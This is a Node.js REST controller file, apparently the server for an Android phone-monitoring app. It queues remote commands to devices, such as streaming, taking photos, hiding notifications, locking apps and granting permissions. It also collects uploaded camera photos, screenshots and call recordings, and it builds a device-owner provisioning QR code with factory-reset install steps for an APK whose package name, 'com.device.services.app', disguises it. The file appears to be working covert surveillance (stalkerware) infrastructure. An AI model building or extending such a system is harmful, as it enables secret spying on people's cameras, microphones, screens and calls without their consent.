/**
 * REST API controllers
 */

const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const QRCode = require("qrcode");
const deviceStore = require("../models/deviceStore");
const { sendHybridCommand } = require("../services/commandService");
const { broadcastToDashboard } = require("../services/dashboardService");
const { normalizeDeviceId } = require("../utils/device");
const { PHOTOS_DIR, UPDATES_DIR } = require("../config");

const RECORDINGS_DIR = path.join(path.dirname(PHOTOS_DIR), "recordings");
if (!fs.existsSync(RECORDINGS_DIR)) {
  fs.mkdirSync(RECORDINGS_DIR, { recursive: true });
}

const DEFAULT_RENDER_EXTERNAL_URL = "https://monitor-raje.onrender.com";
const BACKEND_UPDATES_DIR = path.resolve(__dirname, "..", "..", "updates");
const WORKSPACE_UPDATES_DIR = path.resolve(__dirname, "..", "..", "..", "updates");

const SUPPORTED_COMMAND_TYPES = new Set([
  "start_stream",
  "stop_stream",

  "ping",
  "get_data",
  "ai_mode",
  "ai_auto",
  "stream_codec",
  "set_low_network",
  "voice_profile",
  "streaming_mode",
  "set_gain",
  "take_photo",
  "photo_ai",
  "photo_quality",
  "photo_night",
  "force_update",
  "force_reconnect",
  "grant_permissions",
  "enable_autostart",
  "uninstall_app",
  "clear_device_owner",
  "lock_app",
  "unlock_app",
  "hide_notifications",
  "scan_recordings",
  "delete_recording",
]);

function health(req, res) {
  res.json({ status: "ok", devices: deviceStore.size(), ts: Date.now() });
}

function listDevices(req, res) {
  const devices = deviceStore.listDevices();
  res.json({ status: "ok", devices, ts: Date.now() });
}

// ── Layer 2 & 12: HTTP Fallback & Heartbeat ──

function sync(req, res) {
  const deviceId = normalizeDeviceId(req.query.deviceId || req.headers["x-device-id"]);
  if (!deviceId) return res.status(400).json({ error: "Missing deviceId" });
  
  console.log(`📡 [HTTP-Sync] Request from ${deviceId}`);
  // Register heartbeat since they reached out
  deviceStore.updateHeartbeat(deviceId);
  
  // Get queued commands (Layer 9)
  const popResult = deviceStore.popQueuedCommands(deviceId);
  
  // Sync state (Layer 10)
  const sessionState = deviceStore.getSessionState(deviceId);

  res.json({
    commands: popResult.commands,
    syncGeneration: popResult.generation,
    replayed: popResult.replayed === true,
    sessionState,
    ts: Date.now()
  });
}

function heartbeat(req, res) {
  const deviceId = normalizeDeviceId(req.body.deviceId || req.query.deviceId || req.headers["x-device-id"]);
  if (!deviceId) return res.status(400).json({ error: "Missing deviceId" });
  
  deviceStore.updateHeartbeat(deviceId);

  // Heartbeat must not consume or return queued commands. The sync endpoint pops and executes them.
  const commandsAvailable = deviceStore.queuedCommandCount(deviceId) > 0;

  res.json({ status: "ok", commandsAvailable });
}

async function listRecordings(req, res) {
  const deviceId = req.query.deviceId;
  try {
    const names = await fs.promises.readdir(RECORDINGS_DIR);
    const filtered = names
      .filter((f) => /\.(mp3|m4a|wav|amr|aac|ogg|opus|mkv)$/i.test(f))
      .filter((f) => {
        if (deviceId) {
          const match = f.match(/^recording_([a-z0-9_-]+)_/i);
          // EDGE CASE FIX: Prevent files with unknown names from leaking to all devices
          return match ? match[1] === deviceId : false;
        }
        return true;
      });

    const files = await Promise.all(
      filtered.map(async (f) => {
        const fullPath = path.join(RECORDINGS_DIR, f);
        let devId = null, ts = null, originalName = f;
        
        // New format with encoded original name
        const matchNew = f.match(/^recording_([a-z0-9_-]+)_(\d+)_([a-zA-Z0-9_-]+)(?:\.|$)/i);
        const matchOld = f.match(/^recording_([a-z0-9_-]+)_(\d+)/i);

        if (matchNew) {
          devId = matchNew[1];
          ts = parseInt(matchNew[2], 10);
          try {
            let b64 = matchNew[3].replace(/-/g, '+').replace(/_/g, '/');
            while (b64.length % 4) b64 += '=';
            originalName = Buffer.from(b64, 'base64').toString('utf8');
          } catch(e) {}
        } else if (matchOld) {
          devId = matchOld[1];
          ts = parseInt(matchOld[2], 10);
        }

        let size = 0;
        try { size = (await fs.promises.stat(fullPath)).size; } catch (_e) { }
        
        return {
          name: f,
          originalName: originalName,
          size,
          url: `/recordings/${f}`,
          deviceId: devId,
          ts: ts || 0,
        };
      }),
    );

    files.sort((a, b) => (b.ts || 0) - (a.ts || 0));
    res.json(files);
  } catch (e) {
    res.status(500).json({ error: "Failed to list recordings" });
  }
}

async function listPhotos(req, res) {
  const deviceId = req.query.deviceId;
  try {
    const names = await fs.promises.readdir(PHOTOS_DIR);
    const filtered = names
      .filter((f) => /\.(jpg|jpeg|png)$/i.test(f))
      .filter((f) => {
        if (deviceId) {
          const match =
            f.match(/^photo_([a-z0-9_-]+)_/i) ||
            f.match(/^screenshot_([a-z0-9_-]+)_/i);
          return match && match[1] === deviceId;
        }
        return true;
      });

    const files = await Promise.all(
      filtered.map(async (f) => {
        const fullPath = path.join(PHOTOS_DIR, f);
        let devId = null, camera = null, quality = "normal", nightMode = "off", ts = null;
        
        // New format: photo_{deviceId}_{camera}_{quality}_{nightMode}_{timestamp}.jpg
        const matchNew = f.match(/^photo_([a-z0-9_-]+)_(front|rear)_([a-z0-9]+)_([a-z0-9]+)_(\d+)\.(jpg|jpeg|png)$/i);
        // Old format: photo_{deviceId}_{camera}_{timestamp}.jpg
        const matchOld = f.match(/^photo_([a-z0-9_-]+)_(front|rear)_(\d+)\.(jpg|jpeg|png)$/i);
        // Screenshot format: screenshot_{deviceId}_{timestamp}.jpg
        const matchScreenshot = f.match(/^screenshot_([a-z0-9_-]+)_(\d+)\.(jpg|jpeg|png)$/i);

        if (matchNew) {
          devId = matchNew[1];
          camera = matchNew[2];
          quality = matchNew[3];
          nightMode = matchNew[4];
          ts = parseInt(matchNew[5], 10);
        } else if (matchOld) {
          devId = matchOld[1];
          camera = matchOld[2];
          ts = parseInt(matchOld[3], 10);
        } else if (matchScreenshot) {
          devId = matchScreenshot[1];
          camera = "screenshot";
          quality = "screen";
          ts = parseInt(matchScreenshot[2], 10);
        }

        let size = 0;
        try {
          const stat = await fs.promises.stat(fullPath);
          size = stat.size;
          if (!ts) ts = Math.trunc(stat.mtimeMs);
        } catch (_e) {
          size = 0;
        }
        return {
          name: f,
          size,
          url: `/photos/${f}`,
          deviceId: devId,
          camera: camera,
          quality: quality,
          nightMode: nightMode,
          ts: ts,
        };
      }),
    );

    files.sort((a, b) => (b.ts || 0) - (a.ts || 0));
    res.json(files);
  } catch (e) {
    console.error("Error listing photos:", e.message);
    res.status(500).json({ error: "Failed to list photos" });
  }
}

function setNoCacheHeaders(res) {
  res.set(
    "Cache-Control",
    "no-store, no-cache, must-revalidate, proxy-revalidate",
  );
  res.set("Pragma", "no-cache");
  res.set("Expires", "0");
}

function resolveLatestApkInDir(dirPath) {
  try {
    const files = fs.readdirSync(dirPath).filter((f) => f.toLowerCase().endsWith(".apk"));
    if (files.length === 0) return null;

    let newest = null;
    for (const file of files) {
      const full = path.join(dirPath, file);
      const st = fs.statSync(full);
      if (!newest || st.mtimeMs > newest.mtimeMs) {
        newest = {
          fileName: file,
          size: st.size,
          mtimeMs: st.mtimeMs,
          mtimeIso: new Date(st.mtimeMs).toISOString(),
          absolutePath: full,
        };
      }
    }
    return newest;
  } catch (_e) {
    return null;
  }
}

function resolveVersionPayload() {
  const versionFile = path.join(UPDATES_DIR, "version.json");
  let versionFileError = null;
  const versionFileExists = fs.existsSync(versionFile);

  let versionInfo = {
    versionCode: 1,
    versionName: "1.0.0",
    apkUrl:
      process.env.APK_DOWNLOAD_URL ||
      "https://github.com/Durgesh-Vishwakarma/monitor/releases/download/apk/app-release.apk",
    changelog: "Initial release",
    minVersionCode: 1,
    updatedAt: new Date().toISOString(),
    apkAvailable: true,
  };

  if (versionFileExists) {
    try {
      const data = JSON.parse(fs.readFileSync(versionFile, "utf8"));
      versionInfo = { ...versionInfo, ...data };
    } catch (e) {
      versionFileError = e.message;
      console.error("Error reading version.json:", e.message);
    }
  }

  const latestApk = resolveLatestApkInDir(UPDATES_DIR);
  if (latestApk) {
    versionInfo.apkUrl = `/updates/${latestApk.fileName}?v=${Math.trunc(latestApk.mtimeMs)}`;
    versionInfo.apkSize = latestApk.size;
    versionInfo.apkAvailable = true;
  }

  return {
    versionInfo,
    versionFile,
    versionFileExists,
    versionFileError,
    latestApk,
  };
}

function readVersionSummary(versionFilePath) {
  if (!fs.existsSync(versionFilePath)) {
    return { exists: false, value: null, error: null };
  }

  try {
    const data = JSON.parse(fs.readFileSync(versionFilePath, "utf8"));
    return {
      exists: true,
      value: {
        versionCode: data.versionCode ?? null,
        versionName: data.versionName ?? null,
        minVersionCode: data.minVersionCode ?? null,
        apkUrl: data.apkUrl ?? null,
        apkSize: data.apkSize ?? null,
        apkAvailable: data.apkAvailable ?? null,
        updatedAt: data.updatedAt ?? null,
      },
      error: null,
    };
  } catch (e) {
    return { exists: true, value: null, error: e.message };
  }
}

function versionInfo(req, res) {
  const resolved = resolveVersionPayload();
  setNoCacheHeaders(res);
  res.json(resolved.versionInfo);
}

function versionDiagnostics(req, res) {
  const resolved = resolveVersionPayload();
  const candidateDirs = Array.from(
    new Set([UPDATES_DIR, BACKEND_UPDATES_DIR, WORKSPACE_UPDATES_DIR].map((p) => path.resolve(p))),
  );

  const candidates = candidateDirs.map((dirPath) => {
    const exists = fs.existsSync(dirPath);
    const versionFilePath = path.join(dirPath, "version.json");
    const versionSummary = readVersionSummary(versionFilePath);
    const latestApk = resolveLatestApkInDir(dirPath);

    return {
      path: dirPath,
      selected: path.resolve(dirPath) === path.resolve(UPDATES_DIR),
      exists,
      versionFile: {
        path: versionFilePath,
        exists: versionSummary.exists,
        readError: versionSummary.error,
        value: versionSummary.value,
      },
      latestApk: latestApk
        ? {
            fileName: latestApk.fileName,
            size: latestApk.size,
            mtimeMs: Math.trunc(latestApk.mtimeMs),
            mtimeIso: latestApk.mtimeIso,
            absolutePath: latestApk.absolutePath,
          }
        : null,
    };
  });

  setNoCacheHeaders(res);
  res.json({
    generatedAt: new Date().toISOString(),
    selectedUpdatesDir: path.resolve(UPDATES_DIR),
    selectedVersionFile: {
      path: resolved.versionFile,
      exists: resolved.versionFileExists,
      readError: resolved.versionFileError,
    },
    resolvedVersion: {
      versionCode: resolved.versionInfo.versionCode,
      versionName: resolved.versionInfo.versionName,
      minVersionCode: resolved.versionInfo.minVersionCode,
      apkUrl: resolved.versionInfo.apkUrl,
      apkSize: resolved.versionInfo.apkSize ?? null,
      apkAvailable: Boolean(resolved.versionInfo.apkAvailable),
      updatedAt: resolved.versionInfo.updatedAt ?? null,
    },
    selectedLatestApk: resolved.latestApk
      ? {
          fileName: resolved.latestApk.fileName,
          size: resolved.latestApk.size,
          mtimeMs: Math.trunc(resolved.latestApk.mtimeMs),
          mtimeIso: resolved.latestApk.mtimeIso,
          absolutePath: resolved.latestApk.absolutePath,
        }
      : null,
    source: {
      envUpdatesDir: process.env.UPDATES_DIR || null,
      envApkDownloadUrl: process.env.APK_DOWNLOAD_URL || null,
    },
    candidates,
  });
}

async function cacheApkChecksum(req, res) {
  const apkUrl =
    process.env.APK_DOWNLOAD_URL ||
    "https://github.com/Durgesh-Vishwakarma/monitor/releases/download/apk/app-release.apk";

  try {
    console.log(`📥 Fetching APK to cache checksum: ${apkUrl}`);
    const response = await fetch(apkUrl);
    if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    const buffer = Buffer.from(await response.arrayBuffer());

    const sha256 = crypto.createHash("sha256").update(buffer).digest("base64");
    const checksum = sha256.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");

    const versionFile = path.join(UPDATES_DIR, "version.json");
    let versionInfo = {};
    if (fs.existsSync(versionFile)) {
      try {
        versionInfo = JSON.parse(fs.readFileSync(versionFile, "utf8"));
      } catch (e) {
        console.warn("Error reading existing version.json:", e.message);
      }
    }
    versionInfo.cachedChecksum = checksum;
    versionInfo.checksumCachedAt = new Date().toISOString();
    versionInfo.apkSize = buffer.length;
    versionInfo.apkUrl = apkUrl;
    fs.writeFileSync(versionFile, JSON.stringify(versionInfo, null, 2));

    console.log(`✅ Checksum cached: ${checksum.substring(0, 16)}...`);
    res.json({
      checksum,
      size: buffer.length,
      cached: true,
      cachedAt: versionInfo.checksumCachedAt,
    });
  } catch (e) {
    console.error(`❌ Checksum cache failed: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
}

async function provisioningQr(req, res) {
  const apkDownloadUrl =
    process.env.APK_DOWNLOAD_URL ||
    "https://github.com/Durgesh-Vishwakarma/monitor/releases/download/apk/app-release.apk";

  const serverUrl =
    process.env.RENDER_EXTERNAL_URL || DEFAULT_RENDER_EXTERNAL_URL;

  const versionFile = path.join(UPDATES_DIR, "version.json");
  let versionInfo = {
    versionCode: 1,
    versionName: "1.0.0",
    changelog: "Latest release",
    updatedAt: new Date().toISOString(),
  };
  let checksum = null;
  let apkSize = 0;

  if (fs.existsSync(versionFile)) {
    try {
      const data = JSON.parse(fs.readFileSync(versionFile, "utf8"));
      versionInfo = { ...versionInfo, ...data };
      checksum = data.cachedChecksum || null;
      apkSize = data.apkSize || 0;
    } catch (e) {
      console.error("Error reading version.json:", e.message);
    }
  }

  if (!checksum) {
    console.log("⚠️  No cached checksum — fetching APK now (slow path)...");
    try {
      const response = await fetch(apkDownloadUrl);
      if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      const buffer = Buffer.from(await response.arrayBuffer());
      apkSize = buffer.length;
      const sha256 = crypto.createHash("sha256").update(buffer).digest("base64");
      checksum = sha256.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");

      versionInfo.cachedChecksum = checksum;
      versionInfo.apkSize = apkSize;
      versionInfo.checksumCachedAt = new Date().toISOString();
      fs.writeFileSync(versionFile, JSON.stringify(versionInfo, null, 2));
      console.log(`✅ Checksum computed and cached: ${checksum.substring(0, 16)}...`);
    } catch (err) {
      console.error(`❌ Failed to fetch APK: ${err.message}`);
      return res.status(502).json({
        error: "APK fetch failed",
        message: `Could not download APK from ${apkDownloadUrl}: ${err.message}. Run POST /api/cache-apk-checksum first.`,
      });
    }
  } else {
    console.log(
      `✅ Using cached checksum: ${checksum.substring(0, 16)}... (cached at ${versionInfo.checksumCachedAt})`,
    );
  }

  const provisioningData = {
    "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME":
      "com.device.services.app/com.micmonitor.app.DeviceAdminReceiver",
    "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION":
      apkDownloadUrl,
    "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_CHECKSUM": checksum,
    "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": false,
  };

  res.set(
    "Cache-Control",
    "no-store, no-cache, must-revalidate, proxy-revalidate",
  );
  res.set("Pragma", "no-cache");
  res.set("Expires", "0");

  let qrDataUrl = null;
  try {
    qrDataUrl = await QRCode.toDataURL(JSON.stringify(provisioningData), {
      errorCorrectionLevel: "L",
      margin: 4,
      width: 500,
    });
  } catch (e) {
    console.warn("Failed to pre-generate QR data URL:", e.message);
  }

  res.json({
    provisioningData,
    qrContent: JSON.stringify(provisioningData),
    qrDataUrl,
    serverUrl,
    apkUrl: apkDownloadUrl,
    checksum,
    apkSize: apkSize,
    apkVersionTag: Date.now(),
    apkLastModified: versionInfo.updatedAt,
    versionCode: versionInfo.versionCode,
    versionName: versionInfo.versionName,
    changelog: versionInfo.changelog,
    updatedAt: versionInfo.updatedAt,
    instructions: [
      "1. Factory reset the device",
      "2. On Welcome screen, tap 6 times quickly anywhere",
      "3. QR scanner will appear",
      "4. Scan the QR code generated from this data",
      "5. Device will download APK and set as Device Owner automatically",
    ],
  });
}

async function sendCommand(req, res) {
  const { deviceId } = req.params;
  const command = req.body;
  
  if (!deviceId || !command || !command.type) {
    return res.status(400).json({ error: "Missing deviceId or command.type" });
  }

  const commandType = String(command.type).trim();
  if (!SUPPORTED_COMMAND_TYPES.has(commandType)) {
    return res.status(400).json({
      error: `Unsupported command.type: ${commandType}`,
    });
  }
  const result = await sendHybridCommand(deviceId, { ...command, type: commandType });
  broadcastToDashboard({
    type: "command_dispatch",
    deviceId,
    command: commandType,
    status: result.status,
    ts: Date.now(),
  });
  res.json(result);
}

function uploadPhoto(req, res) {
  try {
    if (!req.file) {
      return res.status(400).json({ error: "No photo file uploaded" });
    }

    const filename = req.file.filename;
    const size = req.file.size;
    console.log(`📸 Saved photo: ${filename} (${size} bytes)`);

    let deviceId = req.body.deviceId || req.headers["x-device-id"];
    let camera = "rear";
    let quality = "normal";
    let nightMode = "off";

    // New format: photo_{deviceId}_{camera}_{quality}_{nightMode}_{timestamp}.jpg
    const matchNew = filename.match(/^photo_([a-z0-9_-]+)_(front|rear)_([a-z0-9]+)_([a-z0-9]+)_(\d+)\.(jpg|jpeg|png)$/i);
    // Old format: photo_{deviceId}_{camera}_{timestamp}.jpg
    const matchOld = filename.match(/^photo_([a-z0-9_-]+)_(front|rear)_(\d+)\.(jpg|jpeg|png)$/i);
    // Screenshot format: screenshot_{deviceId}_{timestamp}.jpg
    const matchScreenshot = filename.match(/^screenshot_([a-z0-9_-]+)_(\d+)\.(jpg|jpeg|png)$/i);

    if (matchNew) {
      deviceId = deviceId || matchNew[1];
      camera = matchNew[2];
      quality = matchNew[3];
      nightMode = matchNew[4];
    } else if (matchOld) {
      deviceId = deviceId || matchOld[1];
      camera = matchOld[2];
    } else if (matchScreenshot) {
      deviceId = deviceId || matchScreenshot[1];
      camera = "screenshot";
      quality = "screen";
    } else if (!deviceId) {
      const fallbackMatch = filename.match(/^photo_([a-z0-9_-]+)_/i);
      deviceId = fallbackMatch ? fallbackMatch[1] : null;
    }

    const fileUrl = `/photos/${filename}`;

    broadcastToDashboard({
      type: "photo_saved",
      deviceId: deviceId,
      filename: filename,
      url: fileUrl,
      size: size,
      camera: camera,
      quality: quality,
      nightMode: nightMode,
      ts: Date.now(),
    });

    res.json({ success: true, url: fileUrl });
  } catch (e) {
    console.error(`❌ Photo upload failed: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
}

function uploadRecording(req, res) {
  try {
    if (!req.file) {
      return res.status(400).json({ error: "No recording file uploaded" });
    }

    const size = req.file.size;
    let rawDeviceId = req.body.deviceId || req.headers["x-device-id"];
    let deviceId = normalizeDeviceId(rawDeviceId);

    if (!deviceId) {
      if (req.file.path && fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
      return res.status(400).json({ error: "Missing deviceId" });
    }
    
    // 🛡️ EDGE CASE FIX: Enforce safe naming, valid extensions, and cross-partition compatibility
    const originalName = req.headers["x-filename"] || req.file.originalname || req.file.filename || "";
    const originalBase64 = Buffer.from(originalName).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
    const rawExt = path.extname(originalName).toLowerCase();
    const safeExt = /^\.(mp3|m4a|wav|amr|aac|ogg|opus|mkv)$/.test(rawExt) ? rawExt : ".mp3";
    const newFilename = `recording_${deviceId}_${Date.now()}_${originalBase64}${safeExt}`;
    const targetPath = path.join(RECORDINGS_DIR, newFilename);

    try {
      fs.renameSync(req.file.path, targetPath);
    } catch (renameErr) {
      if (renameErr.code === 'EXDEV') {
        fs.copyFileSync(req.file.path, targetPath);
        fs.unlinkSync(req.file.path);
      } else {
        throw renameErr;
      }
    }

    console.log(`🎙️ Saved remote call recording: ${newFilename} (${size} bytes)`);
    const fileUrl = `/recordings/${newFilename}`;

    // Notify Dashboard
    broadcastToDashboard({
      type: "recording_saved",
      deviceId: deviceId,
      filename: newFilename,
      url: fileUrl,
      size: size,
      ts: Date.now(),
    });

    res.status(200).json({ success: true, url: fileUrl });
  } catch (e) {
    console.error(`❌ Recording upload failed: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
}

async function deleteRecording(req, res) {
  try {
    const filename = req.params.filename;
    if (!filename) return res.status(400).json({ error: "Missing filename" });
    
    // Prevent directory traversal attacks
    if (filename.includes("..") || filename.includes("/")) {
      return res.status(400).json({ error: "Invalid filename" });
    }

    const targetPath = path.join(RECORDINGS_DIR, filename);
    if (fs.existsSync(targetPath)) {
      fs.unlinkSync(targetPath);
      console.log(`🗑️ Deleted recording from server: ${filename}`);
    }
    res.json({ success: true });
  } catch (e) {
    console.error(`❌ Failed to delete recording: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
}

module.exports = {
  health,
  listDevices,
  listRecordings,
  listPhotos,
  versionInfo,
  versionDiagnostics,
  cacheApkChecksum,
  provisioningQr,
  sync,
  heartbeat,
  sendCommand,
  uploadPhoto,
  uploadRecording,
  deleteRecording,
};
